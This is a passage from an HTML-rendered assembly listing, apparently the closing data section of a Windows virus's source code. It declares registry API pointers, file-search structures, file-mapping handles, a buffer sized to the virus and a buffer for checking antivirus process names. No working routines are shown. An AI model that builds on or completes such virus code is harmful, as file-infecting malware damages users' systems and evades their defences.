 </span><span class="sc5">XRegQueryValueExA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">XRegCloseKey</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">XRegSetValueExA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">XRegCreateKeyExA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">XRegEnumKeyA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

 </span><span class="sc5">ADVHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Handle of ADVAPI32.dll</span><span class="sc0">
 
 </span><span class="sc5">NewSize</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; New Filesize</span><span class="sc0">
 </span><span class="sc5">CmdLine</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Commandline</span><span class="sc0">
 
                           </span><span class="sc1">; Struktur for FindFirstFile / Next</span><span class="sc0">
 </span><span class="sc5">FILETIME</span><span class="sc0">                </span><span class="sc9">STRUC</span><span class="sc0">
 </span><span class="sc5">FT_dwLowDateTime</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">FT_dwHighDateTime</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">FILETIME</span><span class="sc0">                </span><span class="sc9">ENDS</span><span class="sc0">

                           </span><span class="sc1">; data for FindFirstFile / Next API</span><span class="sc0">
 </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">         </span><span class="sc9">label</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0">
 </span><span class="sc5">WFD_dwFileAttributes</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">WFD_ftCreationTime</span><span class="sc0">      </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">WFD_ftLastAccessTime</span><span class="sc0">    </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">WFD_ftLastWriteTime</span><span class="sc0">     </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">WFD_nFileSizeHigh</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">WFD_nFileSizeLow</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">WFD_dwReserved0</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">WFD_dwReserved1</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">WFD_szFileName</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">260d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">WFD_szAlternateFileName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">13</span><span class="sc0">   </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">WFD_szAlternateEnding</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">03</span><span class="sc0">   </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

 </span><span class="sc5">FileHandle</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">; Filehandle</span><span class="sc0">
 </span><span class="sc5">MapHandle</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">; Handle of the Map</span><span class="sc0">
 </span><span class="sc5">MapAddress</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">; Offset of the  Map</span><span class="sc0">
 </span><span class="sc5">Handle</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">

 </span><span class="sc5">Dispostiton</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">; dispostition when creating a reg key</span><span class="sc0">
 </span><span class="sc5">RegHandle</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">; handle of an opened registry key</span><span class="sc0">
 </span><span class="sc5">RegData1</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">; Bytes read</span><span class="sc0">


 </span><span class="sc5">InfCounter</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">          </span><span class="sc1">; Counter</span><span class="sc0">
 </span><span class="sc5">FindHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">          </span><span class="sc1">; Handle for FindFirstFile API</span><span class="sc0">
 </span><span class="sc5">FileBuffer</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">VirusSize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
                          </span><span class="sc1">; We temporarily save the name of a possible AV</span><span class="sc0">
                          </span><span class="sc1">; to check if it is one</span><span class="sc0">
 </span><span class="sc5">NameBuffer</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">255d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">CurrentPath</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">255d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">; ------------------------[ That's all, go home ]----------------------------</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Virus</span><span class="sc0">

</span></div></body>
</html>
